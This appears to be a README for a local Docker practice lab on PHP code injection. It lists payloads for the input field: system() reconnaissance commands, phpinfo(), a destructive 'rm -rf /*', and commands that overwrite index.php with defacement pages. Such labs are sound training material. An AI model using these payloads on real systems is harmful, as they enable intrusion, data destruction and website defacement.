# PHP code injection

start
```bash
docker-compose up -d 
```

then visit http://localhost


try this out, at input

```bash
system("whoami")
#
gethostbyname($_SERVER['SERVER_NAME'])
#
phpinfo()
#
system('id')
#
system("ls -l /")
#
system("hostname -I")
# delete site :)
system("rm -rf /*")
# fun | then u should reload page or enter result
system("rm -rf /var/www/html/index.php && echo '<body><h1>U HAVE BEEN HACKED</h1></body>' > /var/www/html/index.php")
# fun | then u should reload page or enter result
system("rm -rf /var/www/html/index.php && echo '<img src=\"https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZzR6MGM2Y3ZxczBzYTlnaHR5bTMxbjBxYnhnbTlxODFvOGg5Mjc3eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/KmHueA88mFABT9GkkR/giphy.gif\" alt=\"My cool gif\" width=\"100%\">' > /var/www/html/index.php")
```
